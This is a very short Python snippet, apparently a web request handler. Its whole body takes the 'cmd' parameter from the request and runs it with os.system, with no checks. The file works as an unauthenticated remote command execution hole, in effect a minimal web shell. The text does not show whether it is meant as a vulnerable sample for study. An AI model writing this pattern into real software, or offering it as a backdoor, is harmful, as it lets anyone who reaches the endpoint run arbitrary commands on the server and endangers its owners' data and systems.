import os


def handler(request):
    cmd = request.params["cmd"]
    os.system(cmd)
